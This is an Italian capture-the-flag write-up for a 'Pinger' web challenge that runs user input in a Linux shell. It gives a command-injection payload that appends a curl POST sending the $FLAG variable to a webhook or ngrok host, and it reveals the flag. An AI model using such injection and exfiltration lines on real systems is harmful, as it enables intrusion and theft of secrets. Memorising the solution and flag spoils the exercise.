# CodeVinci Pinger
## Introduzione
Ho creato questo sito per vedere se un sito è online, mi raccomando, negli url non sono ammessi gli spazi!
## Vulnerabilità 
RCE
## Risoluzione
La challenge permette di inserire un input che verrà poi fatto eseguire da una shell linux, non essendoci un output dovremo quindi inviarci il risultato del comando tramite `curl` o `wget`:

solve:
`8.8.8.8;curl -X POST --data "$FLAG" "<url di webhook.sit | url di ngrok>"`
## Flag
`CodeVinciCTF{4lw4ys_ch3ck_inputs}`
## Requirements
librerie: flask
flag in $FLAG
## Autore
@gioppy.